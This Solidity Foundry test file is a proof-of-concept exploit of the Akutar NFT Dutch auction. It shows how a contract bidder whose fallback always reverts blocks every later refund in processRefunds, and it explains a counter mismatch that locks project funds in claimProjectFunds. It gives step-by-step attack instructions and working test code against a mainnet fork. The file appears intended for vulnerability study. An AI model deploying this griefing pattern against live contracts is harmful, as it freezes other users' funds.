// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

/*
Akutar NFT Denial of Service(DoS) Exploit PoC

There are two serious logic vulnerabilities

1. First can cause a DoS attack due to the missing check if the bidder is a contract. As a result, the attacker can call the revert() and stop the honest bidders from getting back their bid amount.

2. The Second will make the project fund (more than 34M USD) being locked forever due to incorrect check in the require statement.

forge test --contracts ./src/test/AkutarNFT_exp.sol -vv  
*/

// VULNERABILITY: Reverting Contract Bidder Causes Atomic Refund DoS in processRefunds (RCE-like grief via low-level call require)
// Root cause: AkuAuction._bid (and bid) blindly accepts any msg.sender as bidder without checking !Address.isContract(msg.sender) or using a pull-payment pattern / try-catch isolation. It stores the contract address into allBids[bidIndex] (see lines 536-539 in source: myBids.bidder = msg.sender; ... allBids[bidIndex] = myBids; bidIndex++). Later, processRefunds (public, no auth) iterates allBids using refundProgress/bidIndex (lines 591-611):
//   for (uint256 i=_refundProgress; ... i < _bidIndex; i++) {
//       bids memory bidData = allBids[i];
//       if (...) {
//           ...
//           allBids[i].finalProcess = 1;
//           if (refund > 0) {
//               (bool sent, ) = bidData.bidder.call{value: refund}("");
//               require(sent, "Failed to refund bidder");   <--- FAILS if bidder contract's fallback/receive reverts
//           }
//       }
//       ...
//       _refundProgress++;
//   }
//   refundProgress = _refundProgress;
// The low-level call returns success=false on revert inside target (no gas stipend issue here, but require makes it atomic). Because the require is not inside a try or per-bidder isolation, the ENTIRE processRefunds tx reverts. Prior state writes (finalProcess, _refundProgress) are rolled back. Subsequent calls hit the same i and revert identically. No skip for bad bidders, no per-bidder progress, no contract filter. The test contract itself acts as malicious bidder via its fallback().
// Why it works: Dutch auction overpayment refunds (the (bidData.price - getPrice()) delta) are pushed only in processRefunds (not during bid if exact amount sent, see _bid: if(refund>0) only for excess at bid time). Contract can bid exact price (3.5e) to register without receiving during bid tx.
// Impact: All prior bidders' refunds are blocked forever (DoS on fund return). Honest users who bid after malicious never get their ETH back. Griefing attack, no profit to attacker but locks user funds and prevents auction completion.
//
// VULNERABILITY: Incorrect Counter Comparison in claimProjectFunds Locks Project Funds Permanently
// Root cause: claimProjectFunds (onlyOwner) has:
//   require(refundProgress >= totalBids, "Refunds not yet processed");
//   require(akuNFTs.airdropProgress() >= totalBids, "Airdrop not complete");
//   ... send balance to project
// But refundProgress (init 1, advanced per unique bidder slot in processRefunds up to bidIndex) counts *bid entries* (one per unique bidder, incremented only on first bid: bidIndex++ at 539). totalBids counts *NFT units* (incremented by `amount` each bid: totalBids = _totalBids; _totalBids = totalBids + amount; at 518/542; capped at totalForAuction=5495). With maxBids=3, a single bidder entry can account for 1-3 NFTs => when multi-bids occur (expected), bidIndex-1 << totalBids, so refundProgress (max ~#bidders) can NEVER >= totalBids. The second airdrop check may also fail but the first is sufficient blocker. (See state decl at 462-466, 466: refundProgress=1; 463: totalBids; bid logic 518,542; process 611; claim 616.)
// Why it works: The require mixes two incommensurate quantities (bid slots vs. allocated NFTs). Even if processRefunds runs to completion (which the first vuln prevents), claim remains impossible for realistic auctions.
// Impact: >34M USD (totalBidValue) held in contract after partial overpay refunds cannot be claimed by owner/project. Combined with DoS, user overpayments + principal bid amounts are frozen indefinitely. No withdrawal path for users beyond emergency (after 3d + finalProcess check).
// EXPLOIT STEPS (for DoS, as demonstrated in testDOSAttack):
// 1. Attacker (contract) calls bid(1) with exact current getPrice() amount (e.g. 3.5 ether) so no immediate excess refund in _bid (refund calc at 546 is 0). This registers address(this) as bidder in allBids[bidIndex] via _bid path 536-539, without any isContract guard.
// 2. Honest EOA bids after (higher or same), registering later slot. Both stored with their bid prices.
// 3. Warp time past expiresAt.
// 4. Attacker calls processRefunds(). Loop starts at low refundProgress, hits attacker's slot i, computes refund (delta), sets finalProcess=1 (in mem), does bidder.call{value} which invokes attacker's fallback() { revert("CAUSE REVERT !!!"); }, sent=false, require reverts the tx atomically.
// 5. refundProgress never persisted forward; any retry or other caller will hit the same failing bidder again. Honest user's later refund never executed.
// 6. (Separately for funds lock): Even if refunds somehow finished, owner calling claimProjectFunds() will fail the refundProgress >= totalBids check (e.g. ~2000 bidders vs 5495 NFTs), locking balance.
// Additional: same low-level call+require pattern exists in _bid excess refund (548) and emergencyWithdraw (577), which could also be DoS'd if victim bid from reverting contract, but main attack uses post-auction processRefunds.
contract AkutarNFTExploit is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IAkutarNFT akutarNft = IAkutarNFT(0xF42c318dbfBaab0EEE040279C6a2588Fa01a961d);

    function setUp() public {
        cheats.createSelectFork("http://127.0.0.1:8545", 14_636_844); // fork mainnet at 14636844
    }

    function testDOSAttack() public {
        address honestUser = 0xca2eB45533a6D5E2657382B0d6Ec01E33a425BF4;
        address maliciousUser = address(this); // malicious User is a contract address

        cheats.prank(maliciousUser); //maliciousUser makes a bid
        akutarNft.bid{value: 3.5 ether}(1);
        console.log("honestUser Balance before Bid: ", honestUser.balance / 1 ether);

        cheats.prank(honestUser); //honestUser makes a bid
        akutarNft.bid{value: 3.75 ether}(1);
        console.log("honestUser Balance after Bid: ", honestUser.balance / 1 ether);

        //Set the block.height to the time when the auction was over and processRefunds() can be invoked
        //https://etherscan.io/tx/0x62d280abc60f8b604175ab24896c989e6092e496ac01f2f5399b2a62e9feaacf
        //use - https://www.epochconverter.com/ for UTC <-> epoch
        cheats.warp(1_650_674_809);

        cheats.prank(maliciousUser);
        try akutarNft.processRefunds() {}
        catch Error(string memory Exception) {
            console.log("processRefunds() REVERT : ", Exception);
        }
        //Since the honestUser's bid was after maliciousUser's bid, the bid amount of the honestUser is never returned due to the revert Exception
        console.log("honestUser Balance post processRefunds: ", honestUser.balance / 1 ether);
    }

    function testclaimProjectFunds() public {
        address ownerOfAkutarNFT = 0xCc0eCD808Ce4fEd81f0552b3889656B28aa2BAe9;

        //Set the block.height to the time when the auction was over and claimProjectFunds() can be invoked
        cheats.warp(1_650_672_435);

        cheats.prank(ownerOfAkutarNFT);
        try akutarNft.claimProjectFunds() {}
        catch Error(string memory Exception) {
            console.log("claimProjectFunds() ERROR : ", Exception);
        }
    }

    fallback() external {
        revert("CAUSE REVERT !!!");
    }
}
